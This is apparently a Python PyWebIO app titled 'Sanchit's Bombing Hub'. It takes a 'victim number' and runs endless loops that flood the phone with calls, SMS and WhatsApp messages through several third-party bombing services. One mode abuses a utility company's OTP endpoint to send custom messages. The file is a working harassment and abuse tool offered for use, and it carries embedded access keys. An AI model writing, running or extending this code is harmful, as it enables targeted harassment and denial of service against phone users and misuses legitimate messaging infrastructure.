import pywebio.output as output
import pywebio.input as input
import requests
import time

count = {}

def scroll():
    output.put_html('<script>window.scrollTo(0, document.body.scrollHeight);</script>')

def MyApp():
    output.put_html('<div style="position: fixed; bottom: 10px; right: 10px; cursor: pointer; text-align: center;">' +
                    '<a href="https://www.instagram.com/sanch1t_" target="_blank" style="text-decoration: none; color: transparent; -webkit-background-clip: text; background-image: linear-gradient(45deg, #f9ca24, #e74c3c, #3498db, #2ecc71, #9b59b6, #e67e22, #27ae60); background-size: 400% 400%; animation: glowAnimation 12s infinite;">' +
                    '<img src="https://i.ibb.co/syQZmLf/pngtree-three-dimensional-instagram-icon-png-image-6618437.png" alt="Instagram Logo" style="width: 50px; height: 50px; border-radius: 50%;"></a>' +
                    '</div>'
                    '<style>')
    output.put_html('<div style="position: fixed; bottom: 65px; right: 10px; cursor: pointer; text-align: center;">' +
                    '<a href="https://t.me/X668F" target="_blank" style="text-decoration: none; color: transparent; -webkit-background-clip: text; background-image: linear-gradient(45deg, #f9ca24, #e74c3c, #3498db, #2ecc71, #9b59b6, #e67e22, #27ae60); background-size: 400% 400%; animation: glowAnimation 12s infinite;">' +
                    '<img src="https://i.ibb.co/McwXVS4/png-clipart-telegram-logo-computer-icons-others-miscellaneous-blue.png" alt="Telegram Logo" style="width: 51px; height: 50px; border-radius: 50%;"></a>' +
                    '</div>'
                    '<style>'
                    )
    output.put_html('<div style="text-align: center; font-size: 1.5em; font-family: \'Pacifico\', cursive; color: transparent; -webkit-background-clip: text; background-image: linear-gradient(45deg, #f9ca24, #e74c3c, #3498db, #2ecc71, #9b59b6, #e67e22, #27ae60); background-size: 600% 600%; animation: glowAnimation 12s infinite; -webkit-text-stroke: 1px black;">'
                '<h1>Welcome to Sanchit\'s Bombing Hub!</h1></div>'
                '<style>'
                '@keyframes glowAnimation {'
                '0% { background-position: 0% 50%; }'
                '50% { background-position: 100% 50%; }'
                '100% { background-position: 0% 50%; }'
                '</style>'
                '<style>'
                '@keyframes colorAnimation {'
                '0% { color: #e74c3c; }'
                '10% { color: #f39c12; }'
                '20% { color: #3498db; }'
                '30% { color: #2ecc71; }'
                '40% { color: #9b59b6; }'
                '50% { color: #e67e22; }'
                '60% { color: #27ae60; }'
                '70% { color: #e74c3c; }'
                '80% { color: #f39c12; }'
                '90% { color: #2ecc71; }'
                '100% { color: #3498db; }'
                '</style>'
                )

    mm = input.input_group('This Are Our Collection', [
        input.radio('Choose What You Want:', options=['Call Bomber', 'Sms Bomber', 'Custom Sms Bomber', 'Mix Bomber', 'WhatsApp Bomber'], name='meth')
    ])

    method = mm['meth']

    if method == 'Call Bomber':
        skc = input.input_group('• Call Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="SK")])
        SK = str(skc["SK"])
        if SK not in count:
            count[SK] = {"successful": 0, "failed": 0}
        else:
            count[SK]["successful"] = 0
            count[SK]["failed"] = 0
        while True:
            url4 = requests.post("http://callbombers.fun/Call-Bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
            url2 = requests.post("http://callbombers.fun/sms-bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
            url = requests.post("http://callbombers.fun/Whatsapp-Bomber/", data={'number': SK, 'key': '@Toolbomb', 'sub': 'SEND'})
            req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
            if 'started' in req == 200:
                count[SK]["successful"] += 1
                output.put_html(
                    f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Call Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[SK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[SK]["failed"] += 1
                output.put_html(
                    f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Call Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[SK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)

    elif method == 'Sms Bomber':
        skc = input.input_group('• Sms Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="JK")])
        JK = str(skc["JK"])
        if JK not in count:
            count[JK] = {"successful": 0, "failed": 0}
        else:
            count[JK]["successful"] = 0
            count[JK]["failed"] = 0
        while True:
            req = requests.get(f"https://bomber-tools.xyz/sms/?mobile={JK}&accesskey=BomberSmm&submit=Submit").text
            if 'started' in req:
                count[JK]["successful"] += 1
                output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[JK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[JK]["failed"] += 1
                output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[JK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)

    elif method == 'Custom Sms Bomber':
        skc = input.input_group('• Custom Sms Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="NK"),input.input(" • Enter The Message (In 30 Characters)", name="MK")])
        NK = str(skc["NK"])
        MK = str(skc["MK"])
        output.put_html('<div style="text-align:center; background-color:#2c3e50; padding:10px; border:3px solid white;">' +
                        f'<span style="color:#e74c3c; font-weight:bold; text-shadow: 0 0 10px rgba(231, 76, 60, 0.5); -webkit-text-stroke: 1px #c0392b;"> • Your Message View • </span>' +
                        f'<br><br>' +
                        f'<span style="color:#3498db; font-weight:bold; text-shadow: 0 0 10px rgba(52, 152, 219, 0.5); -webkit-text-stroke: 1px #2980b9;"> • {MK} • </span>' +
                        '</div>')    
        if NK not in count:
            count[NK] = {"successful": 0, "failed": 0}
        else:
            count[NK]["successful"] = 0
            count[NK]["failed"] = 0
        while True:
            req = requests.get(f"http://www.jvvnlrms.com:7070/bsmartJVVNL/register/mobileValidateAndSendOTP/hellosir143143/Hello/Hello@123/hellosir143143149@gmail.com/{NK}/{MK}").text
            if 'Sent' in req:
                count[NK]["successful"] += 1
                output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Custom Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
            else:
                count[NK]["failed"] += 1
                output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Custom Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                scroll()
                time.sleep(0.1)
                
    elif method == 'Mix Bomber':
                skc = input.input_group('• Mix Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="RK")])
                RK = str(skc["RK"])
                output.put_html('<div style="text-align:center; background-color:#2c3e50; padding:10px; border:3px solid white;">' +
                        f'<span style="color:#e74c3c; font-weight:bold; text-shadow: 0 0 10px rgba(231, 76, 60, 0.5); -webkit-text-stroke: 1px #c0392b;"> • Notice • </span>' +
                        f'<br><br>' +
                        f'<span style="color:#3498db; font-weight:bold; text-shadow: 0 0 10px rgba(52, 152, 219, 0.5); -webkit-text-stroke: 1px #2980b9;"> • This Will Starts Slowly, So Wait • </span>' +
                        '</div>')
                if RK not in count:
                	count[RK] = {"successful": 0, "failed": 0}
                else:
                	count[RK]["successful"] = 0
                	count[RK]["failed"] = 0
                while True:
                	url4=requests.post("http://callbombers.fun/Call-Bomber/", data={'number': RK, 'key': '@Toolbomb', 'sub': 'SEND'})
                	url2=requests.post("http://callbombers.fun/sms-bomber/", data={'number': RK, 'key': '@Toolbomb', 'sub': 'SEND'})
                	url=requests.post("http://callbombers.fun/Whatsapp-Bomber/", data={'number': RK, 'key': '@Toolbomb', 'sub': 'SEND'})
                	rex=requests.get(f'https://bombersmm.sbs/serverll.php?num={RK}')
                	rexx=requests.get(f'https://bombersmm.sbs/bo.php?num={RK}')
                	rexxx=requests.get(f"https://unknownreason.in/API/index.php?num={RK}")
                	if rex.status_code == 200:
                	               count[RK]["successful"] += 1
                	               output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Mix Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[RK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                	               scroll()
                	               time.sleep(0.1)
                	else:
                		count[RK]["failed"] += 1
                		output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Mix Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[RK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                		scroll()
                		time.sleep(0.1)
                		
    elif method == 'WhatsApp Bomber':
                skc = input.input_group('• WhatsApp Bomber By: SANCHIT 💸', [input.input(" • Enter Victim Number (without +91) ", name="XK")])
                XK = str(skc["XK"])
                output.put_html('<div style="text-align:center; background-color:#2c3e50; padding:10px; border:3px solid white;">' +
                        f'<span style="color:#e74c3c; font-weight:bold; text-shadow: 0 0 10px rgba(231, 76, 60, 0.5); -webkit-text-stroke: 1px #c0392b;"> • Notice • </span>' +
                        f'<br><br>' +
                        f'<span style="color:#3498db; font-weight:bold; text-shadow: 0 0 10px rgba(52, 152, 219, 0.5); -webkit-text-stroke: 1px #2980b9;"> • This Will Starts Slowly, So Wait • </span>' +
                        '</div>')
                if XK not in count:
                	count[XK] = {"successful": 0, "failed": 0}
                else:
                	count[XK]["successful"] = 0
                	count[XK]["failed"] = 0
                while True:
                	fex=requests.get(f'https://bombersmm.sbs/whatt.php?num={XK}')
                	fexx=requests.get(f'https://bombersmm.sbs/server.php?num={XK}')
                	if fex.status_code == 200:
                	               count[XK]["successful"] += 1
                	               output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ WhatsApp Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[XK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                	               scroll()
                	               time.sleep(0.1)
                	else:
                		count[XK]["failed"] += 1
                		output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ WhatsApp Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[XK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
                		scroll()
                		time.sleep(0.1)                
if __name__ == '__main__':
    from pywebio import start_server
    start_server(MyApp, port=8086, debug=True)
